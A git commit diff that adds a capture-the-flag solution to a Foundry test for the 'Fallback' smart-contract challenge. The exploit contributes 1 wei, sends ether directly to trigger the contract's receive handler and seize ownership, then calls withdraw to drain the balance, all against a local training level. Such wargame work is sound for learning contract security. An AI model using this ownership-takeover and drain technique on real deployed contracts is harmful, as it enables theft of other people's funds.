22b4e3e7777a9549b2db4e54218d407f5c8751c0
Kristjan Kosic <kristjan@protokol.com>
2022-08-30 07:13:29 +0000

    chore: Fallback challenge solved

--- test/Fallback.t.sol
+++ test/Fallback.t.sol
@@ -5,6 +5,7 @@ pragma experimental ABIEncoderV2;
 import "./utils/BaseTest.sol";
 import "src/levels/Fallback.sol";
 import "src/levels/FallbackFactory.sol";
+import "forge-std/console2.sol";
 
 contract TestFallback is BaseTest {
     Fallback private level;
@@ -37,6 +38,24 @@ contract TestFallback is BaseTest {
         vm.startPrank(player);
 
         /** CODE YOUR EXPLOIT HERE */
+        // send the minimum amount to become a contributor
+        emit log_named_address("Owner", level.owner());
+        emit log_named_uint("Owner balance", address(level).balance);
+        emit log_named_address("Player", player);
+        emit log_named_uint("Player balance", player.balance);
+        level.contribute{value: 1 wei}();
+
+        emit log_named_uint("Contributions", level.getContribution());
+        emit log_named_address("Owner", level.owner());
+
+        // this calls default receive handler in the contract
+        // see more here: https://solidity-by-example.org/sending-ether/
+        address(level).call{value: 1 wei}("");
+        emit log_named_address("New owner", level.owner());
+
+        // now let's empty that contract :-) as we are the new owner
+        level.withdraw();
+        emit log_named_uint("New balance", player.balance);
 
         vm.stopPrank();
     }
